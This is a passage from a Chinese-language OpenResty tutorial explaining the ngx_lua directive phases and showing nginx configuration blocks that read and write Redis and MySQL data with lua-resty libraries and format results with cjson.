class="hljs-string">&#x27;ngx.say(&quot;&lt;h1&gt;HELLO,OpenRestry&lt;/h1&gt;&quot;)&#x27;</span>;<br>&#125;<br>(<span class="hljs-number">9</span>)在sbin目录下启动nginx<br>(<span class="hljs-number">10</span>)通过浏览器访问测试<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636706604.png" alt="1604636706604" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636719140.png" alt="1604636719140" /></p><h2 id="ngx_lua的使用"><a class="markdownIt-Anchor" href="#ngx_lua的使用"></a> ngx_lua的使用</h2><p>使用Lua编写Nginx脚本的基本构建块是指令。指令用于指定何时运行用户Lua代码以及如何使用结果。下图显示了执行指令的顺序。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604717983815.png" alt="1604717983815" /></p><p>先来解释下*的作用</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">*：无 ， 即 xxx<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua ,指令后面跟的是 lua指令<br>*:<span class="hljs-number">_f</span>ile，即 xxx<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua<span class="hljs-number">_f</span>ile 指令后面跟的是 lua文件<br>*:<span class="hljs-number">_</span>block,即 xxx<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua<span class="hljs-number">_</span>block 在<span class="hljs-number">0.9</span>.<span class="hljs-number">17</span>版后替换init<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>lua<span class="hljs-number">_f</span>ile<br></code></pre></td></tr></table></figure><h3 id="init_by_lua"><a class="markdownIt-Anchor" href="#init_by_lua"></a> init_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令在每次Nginx重新加载配置时执行，可以用来完成一些耗时模块的加载，或者初始化一些全局配置。<br></code></pre></td></tr></table></figure><h3 id="init_worker_by_lua"><a class="markdownIt-Anchor" href="#init_worker_by_lua"></a> init_worker_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令用于启动一些定时任务，如心跳检查、定时拉取服务器配置等。<br></code></pre></td></tr></table></figure><h3 id="set_by_lua"><a class="markdownIt-Anchor" href="#set_by_lua"></a> set_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令只要用来做变量赋值，这个指令一次只能返回一个值，并将结果赋值给Nginx中指定的变量。<br></code></pre></td></tr></table></figure><h3 id="rewrite_by_lua"><a class="markdownIt-Anchor" href="#rewrite_by_lua"></a> rewrite_by_lua*</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">该指令用于执行内部<span class="hljs-built_in">URL</span>重写或者外部重定向，典型的如伪静态化<span class="hljs-built_in">URL</span>重写，本阶段在rewrite处理阶段的最后默认执行。<br></code></pre></td></tr></table></figure><h3 id="access_by_lua"><a class="markdownIt-Anchor" href="#access_by_lua"></a> access_by_lua*</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">该指令用于访问控制。例如，如果只允许内网<span class="hljs-built_in">IP</span>访问。<br></code></pre></td></tr></table></figure><h3 id="content_by_lua"><a class="markdownIt-Anchor" href="#content_by_lua"></a> content_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令是应用最多的指令，大部分任务是在这个阶段完成的，其他的过程往往为这个阶段准备数据，正式处理基本都在本阶段。<br></code></pre></td></tr></table></figure><h3 id="header_filter_by_lua"><a class="markdownIt-Anchor" href="#header_filter_by_lua"></a> header_filter_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令用于设置应答消息的头部信息。<br></code></pre></td></tr></table></figure><h3 id="body_filter_by_lua"><a class="markdownIt-Anchor" href="#body_filter_by_lua"></a> body_filter_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令是对响应数据进行过滤，如截断、替换。<br></code></pre></td></tr></table></figure><h3 id="log_by_lua"><a class="markdownIt-Anchor" href="#log_by_lua"></a> log_by_lua*</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">该指令用于在<span class="hljs-built_in">log</span>请求处理阶段，用Lua代码处理日志，但并不替换原有<span class="hljs-built_in">log</span>处理。<br></code></pre></td></tr></table></figure><h3 id="balancer_by_lua"><a class="markdownIt-Anchor" href="#balancer_by_lua"></a> balancer_by_lua*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令主要的作用是用来实现上游服务器的负载均衡器算法<br></code></pre></td></tr></table></figure><h3 id="ssl_certificate_by_"><a class="markdownIt-Anchor" href="#ssl_certificate_by_"></a> ssl_certificate_by_*</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该指令作用在Nginx和下游服务开始一个SSL握手操作时将允许本配置项的Lua代码。<br></code></pre></td></tr></table></figure><h3 id="需求"><a class="markdownIt-Anchor" href="#需求"></a> 需求:</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">http://192.168.200.133?name=张三&amp;<span class="hljs-keyword">gender</span>=1<br>Nginx接收到请求后，根据<span class="hljs-keyword">gender</span>传入的值，如果<span class="hljs-keyword">gender</span>传入的是1，则在页面上展示<br>张三先生,如果<span class="hljs-keyword">gender</span>传入的是0，则在页面上展示张三女士,如果未传或者传入的不是1和2则在页面上展示张三。<br></code></pre></td></tr></table></figure><p>实现代码</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs 1c">location /getByGender &#123;<br>default_type &#x27;text/html&#x27;;<br>set_by_lua $name <span class="hljs-string">&quot;</span><br>local uri_args = ngx.req.get_uri_args()<br>gender = uri_args[&#x27;gender&#x27;]<br>name = uri_args[&#x27;name&#x27;]<br>if gender==&#x27;1&#x27; then<br>return name..&#x27;先生&#x27;<br>elseif gender==&#x27;0&#x27; then<br>return name..&#x27;女士&#x27;<br>else<br>return name<br>end<br><span class="hljs-string">&quot;;</span><br>header_filter_by_lua <span class="hljs-string">&quot;</span><br>ngx.header.aaa=&#x27;bbb&#x27;<br><span class="hljs-string">&quot;;</span><br>return <span class="hljs-number">200</span> $name;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ngx_lua操作redis"><a class="markdownIt-Anchor" href="#ngx_lua操作redis"></a> ngx_lua操作Redis</h2><p>Redis在系统中经常作为数据缓存、内存数据库使用，在大型系统中扮演着非常重要的作用。在Nginx核心系统中，Redis是常备组件。Nginx支持3种方法访问Redis,分别是HttpRedis模块、HttpRedis2Module、lua-resty-redis库。这三种方式中HttpRedis模块提供的指令少，功能单一，适合做简单缓存，HttpRedis2Module模块比HttpRedis模块操作更灵活，功能更强大。而Lua-resty-redis库是OpenResty提供的一个操作Redis的接口库，可根据自己的业务情况做一些逻辑处理，适合做复杂的业务逻辑。所以本次课程将主要以Lua-resty-redis来进行讲解。</p><h3 id="lua-resty-redis环境准备"><a class="markdownIt-Anchor" href="#lua-resty-redis环境准备"></a> lua-resty-redis环境准备</h3><p>步骤一:准备一个Redis环境</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">连接地址<br><span class="hljs-attribute">host</span><span class="hljs-operator">=</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">200.111</span><br><span class="hljs-attribute">port</span><span class="hljs-operator">=</span><span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604726959698.png" alt="1604726959698" /></p><p>步骤二:准备对应的API</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">lua</span>-resty-redis提供了访问Redis的详细API，包括创建对接、连接、操作、数据处理等。这些API基本上与Redis的操作一一对应。<br>（<span class="hljs-number">1</span>）redis = require <span class="hljs-string">&quot;resty.redis&quot;</span><br>（<span class="hljs-number">2</span>）<span class="hljs-keyword">new</span><br>语法: redis,err = <span class="hljs-keyword">redi</span><span class="hljs-variable">s:new</span>(),创建一个Redis对象。<br>（<span class="hljs-number">3</span>）connect<br>语法:ok,err=<span class="hljs-keyword">redi</span><span class="hljs-variable">s:connect</span>(host,port[,options_table]),设置连接Redis的连接信息。<br>ok:连接成功返回 <span class="hljs-number">1</span>，连接失败返回nil<br>err:返回对应的错误信息<br>（<span class="hljs-number">4</span>）set_timeout<br>语法: <span class="hljs-keyword">redi</span><span class="hljs-variable">s:set_timeout</span>(time) ，设置请求操作Redis的超时时间。<br>（<span class="hljs-number">5</span>）<span class="hljs-keyword">close</span><br>语法: ok,err = <span class="hljs-keyword">redi</span><span class="hljs-variable">s:close</span>(),关闭当前连接，成功返回<span class="hljs-number">1</span>，失败返回nil和错误信息<br>（<span class="hljs-number">6</span>）redis命令对应的方法<br>在<span class="hljs-keyword">lua</span>-resty-redis中，所有的Redis命令都有自己的方法，方法名字和命令名字相同，只是全部为小写。<br><br></code></pre></td></tr></table></figure><p>步骤三:效果实现</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> / &#123;<br>    default_type &quot;text/html&quot;;<br>    content_by_lua_block&#123;<br>        <span class="hljs-keyword">local</span> redis = require &quot;resty.redis&quot; <span class="hljs-comment">-- 引入Redis</span><br>        <span class="hljs-keyword">local</span> redisObj = redis:<span class="hljs-built_in">new</span>()  <span class="hljs-comment">--创建Redis对象</span><br>        redisObj:set_timeout(<span class="hljs-number">1000</span>) <span class="hljs-comment">--设置超时数据为1s</span><br>        <span class="hljs-keyword">local</span> ok,err = redisObj:<span class="hljs-keyword">connect</span>(&quot;192.168.200.1&quot;,<span class="hljs-number">6379</span>) <span class="hljs-comment">--设置redis连接信息</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span> <span class="hljs-comment">--判断是否连接成功</span><br>         ngx.say(&quot;failed to connection redis&quot;,err)<br>         <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">end</span><br>        ok,err = redisObj:<span class="hljs-keyword">set</span>(&quot;username&quot;,&quot;TOM&quot;)<span class="hljs-comment">--存入数据</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span> <span class="hljs-comment">--判断是否存入成功</span><br>         ngx.say(&quot;failed to set username&quot;,err)<br>         <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">local</span> res,err = redisObj:<span class="hljs-keyword">get</span>(&quot;username&quot;) <span class="hljs-comment">--从redis中获取数据</span><br>        ngx.say(res)<span class="hljs-comment">--将数据写会消息体中</span><br>        redisObj:<span class="hljs-keyword">close</span>()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>步骤四:运行测试效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604727475883.png" alt="1604727475883" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604727483869.png" alt="1604727483869" /></p><h2 id="ngx_lua操作mysql"><a class="markdownIt-Anchor" href="#ngx_lua操作mysql"></a> ngx_lua操作Mysql</h2><p>MySQL是一个使用广泛的关系型数据库。在ngx_lua中，MySQL有两种访问模式,分别是使</p><p>（1）用ngx_lua模块和lua-resty-mysql模块：这两个模块是安装OpenResty时默认安装的。</p><p>（2）使用drizzle_nginx_module(HttpDrizzleModule)模块：需要单独安装，这个库现不在OpenResty中。</p><h3 id="lua-resty-mysql"><a class="markdownIt-Anchor" href="#lua-resty-mysql"></a> lua-resty-mysql</h3><p>lua-resty-mysql是OpenResty开发的模块，使用灵活、功能强大，适合复杂的业务场景，同时支持存储过程的访问。</p><h4 id="使用lua-resty-mysql实现数据库的查询"><a class="markdownIt-Anchor" href="#使用lua-resty-mysql实现数据库的查询"></a> 使用lua-resty-mysql实现数据库的查询</h4><p>步骤一:</p><p>准备MYSQL</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.111</span><br><span class="hljs-symbol">port:</span> <span class="hljs-number">3306</span><br><span class="hljs-symbol">username:</span>root<br><span class="hljs-symbol">password:</span><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>创建一个数据库表及表中的数据。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> nginx_db;<br><br>use nginx_db;<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>   id <span class="hljs-type">int</span> <span class="hljs-keyword">primary key</span> auto_increment,<br>   username <span class="hljs-type">varchar</span>(<span class="hljs-number">30</span>),<br>   birthday <span class="hljs-type">date</span>,<br>   salary <span class="hljs-type">double</span><br>);<br><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;TOM&quot;,&quot;1988-11-11&quot;,<span class="hljs-number">10000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;JERRY&quot;,&quot;1989-11-11&quot;,<span class="hljs-number">20000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;ROWS&quot;,&quot;1990-11-11&quot;,<span class="hljs-number">30000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;LUCY&quot;,&quot;1991-11-11&quot;,<span class="hljs-number">40000.0</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,birthday,salary) <span class="hljs-keyword">values</span>(<span class="hljs-keyword">null</span>,&quot;JACK&quot;,&quot;1992-11-11&quot;,<span class="hljs-number">50000.0</span>);<br></code></pre></td></tr></table></figure><p>数据库连接四要素:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">driverClass</span>=com.mysql.jdbc.Driver<br><span class="hljs-attr">url</span>=jdbc:mysql://<span class="hljs-number">192.168</span>.<span class="hljs-number">200.111</span>:<span class="hljs-number">3306</span>/nginx_db<br><span class="hljs-attr">username</span>=root<br><span class="hljs-attr">password</span>=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>步骤二:API学习</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">（<span class="hljs-number">1</span>）引入&quot;resty.mysql&quot;模块<br><span class="hljs-keyword">local</span> mysql = require &quot;resty.mysql&quot;<br>（<span class="hljs-number">2</span>）<span class="hljs-built_in">new</span><br>创建一个MySQL连接对象，遇到错误时，db为nil，err为错误描述信息<br>语法: db,err = mysql:<span class="hljs-built_in">new</span>()<br>（<span class="hljs-number">3</span>）<span class="hljs-keyword">connect</span><br>尝试连接到一个MySQL服务器<br>语法:ok,err=db:<span class="hljs-keyword">connect</span>(<span class="hljs-keyword">options</span>),<span class="hljs-keyword">options</span>是一个参数的Lua表结构，里面包含数据库连接的相关信息<br>    host:服务器主机名或IP地址<br>    port:服务器监听端口，默认为<span class="hljs-number">3306</span><br>    <span class="hljs-keyword">user</span>:登录的用户名<br>    <span class="hljs-keyword">password</span>:登录密码<br>    <span class="hljs-keyword">database</span>:使用的数据库名<br>（<span class="hljs-number">4</span>）set_timeout<br>设置子请求的超时时间(ms)，包括<span class="hljs-keyword">connect</span>方法<br>语法:db:set_timeout(<span class="hljs-type">time</span>)<br>（<span class="hljs-number">5</span>）<span class="hljs-keyword">close</span><br>关闭当前MySQL连接并返回状态。如果成功，则返回<span class="hljs-number">1</span>；如果出现任何错误，则将返回nil和错误描述。<br>语法:db:<span class="hljs-keyword">close</span>()<br>（<span class="hljs-number">6</span>）send_query<br>异步向远程MySQL发送一个查询。如果成功则返回成功发送的字节数；如果错误，则返回nil和错误描述<br>语法:bytes,err=db:send_query(<span class="hljs-keyword">sql</span>)<br>（<span class="hljs-number">7</span>）read_result<br>从MySQL服务器返回结果中读取一行数据。res返回一个描述OK包或结果集包的Lua表,语法:<br>res, err, errcode, <span class="hljs-built_in">sqlstate</span> = db:read_result() <br>res, err, errcode, <span class="hljs-built_in">sqlstate</span> = db:read_result(<span class="hljs-keyword">rows</span>) :<span class="hljs-keyword">rows</span>指定返回结果集的最大值，默认为<span class="hljs-number">4</span><br>如果是查询，则返回一个容纳多行的数组。每行是一个数据列的key-<span class="hljs-keyword">value</span>对，如<br><br>    &#123;<br>      &#123;id=<span class="hljs-number">1</span>,username=&quot;TOM&quot;,birthday=&quot;1988-11-11&quot;,salary=<span class="hljs-number">10000.0</span>&#125;,<br>      &#123;id=<span class="hljs-number">2</span>,username=&quot;JERRY&quot;,birthday=&quot;1989-11-11&quot;,salary=<span class="hljs-number">20000.0</span>&#125;<br>    &#125;<br>如果是增删改，则返回类上如下数据<br>    &#123;<br>    insert_id = <span class="hljs-number">0</span>,<br>    server_status=<span class="hljs-number">2</span>,<br>    warning_count=<span class="hljs-number">1</span>,<br>    affected_rows=<span class="hljs-number">2</span>,<br>    message=nil<br>    &#125;<br>返回值:<br>res:操作的结果集<br>err:错误信息<br>errcode:MySQL的错误码，比如<span class="hljs-number">1064</span><br><span class="hljs-built_in">sqlstate</span>:返回由<span class="hljs-number">5</span>个字符组成的标准<span class="hljs-keyword">SQL</span>错误码，比如<span class="hljs-number">42000</span><br><br></code></pre></td></tr></table></figure><p>步骤三:效果实现</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">location /&#123;<br>    content_by_lua_block&#123;<br>        local mysql = require <span class="hljs-string">&quot;resty.mysql&quot;</span><br>        local db = mysql:<span class="hljs-built_in">new</span>()<br>        local ok,err = db:connect&#123;<br>            host=<span class="hljs-string">&quot;192.168.200.111&quot;</span>,<br>            port=<span class="hljs-number">3306</span>,<br>            user=<span class="hljs-string">&quot;root&quot;</span>,<br>            password=<span class="hljs-string">&quot;123456&quot;</span>,<br>            database=<span class="hljs-string">&quot;nginx_db&quot;</span><br>        &#125;<br>        db:<span class="hljs-built_in">set_timeout</span>(<span class="hljs-number">1000</span>)<br><br>        db:<span class="hljs-built_in">send_query</span>(<span class="hljs-string">&quot;select * from users where id =1&quot;</span>)<br>        local res,err,errcode,sqlstate = db:<span class="hljs-built_in">read_result</span>()<br>        ngx<span class="hljs-selector-class">.say</span>(res<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.id</span>..<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-selector-class">.res</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.username</span>..<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-selector-class">.res</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.birthday</span>..<span class="hljs-string">&quot;,&quot;</span>.<span class="hljs-selector-class">.res</span><span class="hljs-selector-attr">[1]</span>.salary)<br>    db:<span class="hljs-built_in">close</span>()<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>问题:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.如何获取返回数据的内容<br>2.如何实现查询多条数据<br>3.如何实现数据库的增删改操作<br></code></pre></td></tr></table></figure><h4 id="使用lua-cjson处理查询结果"><a class="markdownIt-Anchor" href="#使用lua-cjson处理查询结果"></a> 使用lua-cjson处理查询结果</h4><p>通过上述的案例学习，read_result()得到的结果res都是table类型，要想在页面上展示，就必须知道table的具体数据结构才能进行遍历获取。处理起来比较麻烦，接下来我们介绍一种简单方式cjson，使用它就可以将table类型的数据转换成json字符串，把json字符串展示在页面上即可。具体如何使用?</p><p>步骤一：引入cjson</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">local</span> cjson = <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;cjson&quot;</span><br></code></pre></td></tr></table></figure><p>步骤二：调用cjson的encode方法进行类型转换</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cjson.encode(res) <br></code></pre></td></tr></table></figure><p>步骤三:使用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> /&#123;<br>    content_by_lua_block&#123;<br><br>        <span class="hljs-keyword">local</span> mysql = require &quot;resty.mysql&quot;<br>        <span class="hljs-keyword">local</span> cjson = require &quot;cjson&quot;<br><br>        <span class="hljs-keyword">local</span> db = mysql:<span class="hljs-built_in">new</span>()<br><br>        <span class="hljs-keyword">local</span> ok,err = db:<span class="hljs-keyword">connect</span>&#123;<br>            host=&quot;192.168.200.111&quot;,<br>            port=<span class="hljs-number">3306</span>,<br>            <span class="hljs-keyword">user</span>=&quot;root&quot;,<br>            <span class="hljs-keyword">password</span>=&quot;123456&quot;,<br>            <span class="hljs-keyword">database</span>=&quot;nginx_db&quot;<br>        &#125;<br>        db:set_timeout(<span class="hljs-number">1000</span>)<br><br>        <span class="hljs-comment">--db:send_query(&quot;select * from users where id = 2&quot;)</span><br>        db:send_query(&quot;select * from users&quot;)<br>        <span class="hljs-keyword">local</span> res,err,errcode,<span class="hljs-built_in">sqlstate</span> = db:read_result()<br>        ngx.say(cjson.encode(res))<br>         <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> ipairs(res) <span class="hljs-keyword">do</span><br>       ngx.say(v.id..&quot;,&quot;..v.username..&quot;,&quot;..v.birthday..&quot;,&quot;..v.salary)<br>        <span class="hljs-keyword">end</span><br>    db:<span class="hljs-keyword">close</span>()<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="lua-resty-mysql实现数据库的增删改"><a class="markdownIt-Anchor" href="#lua-resty-mysql实现数据库的增删改"></a> lua-resty-mysql实现数据库的增删改</h4><p>优化send_query和read_result</p><p>本方法是send_query和read_result组合的快捷方法。</p><p>语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">res, err, errcode, <span class="hljs-keyword">sqlstate</span> <span class="hljs-operator">=</span> db:query(<span class="hljs-keyword">sql</span>[,<span class="hljs-keyword">rows</span>])<br></code></pre></td></tr></table></figure><p>有了该API，上面的代码我们就可以进行对应的优化，如下:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stata">location /&#123;<br>    content_by_lua_block&#123;<br><br>        <span class="hljs-keyword">local</span> mysql = require <span class="hljs-string">&quot;resty.mysql&quot;</span><br><br>        <span class="hljs-keyword">local</span> <span class="hljs-keyword">db</span> = mysql:new()<br><br>        <span class="hljs-keyword">local</span> ok,<span class="hljs-keyword">err</span> = <span class="hljs-keyword">db</span>:connect&#123;<br>        host=<span class="hljs-string">&quot;192.168.200.1&quot;</span>,<br>        port=3306,<br>        user=<span class="hljs-string">&quot;root&quot;</span>,<br>        password=<span class="hljs-string">&quot;123456&quot;</span>,<br>        database=<span class="hljs-string">&quot;nginx_db&quot;</span>,<br>        max_packet_size=1024,<br>        compact_arrays=false<br>        &#125;<br>        <span class="hljs-keyword">db</span>:set_timeout(1000)<br>        <span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;select * from users&quot;</span>)<br>        --<span class="hljs-keyword">local</span> res,<span class="hljs-keyword">err</span>,errcode,sqlstate = <span class="hljs-keyword">db</span>:<span class="hljs-keyword">query</span>(<span class="hljs-string">&quot;insert into users(id,username,birthday,salary) 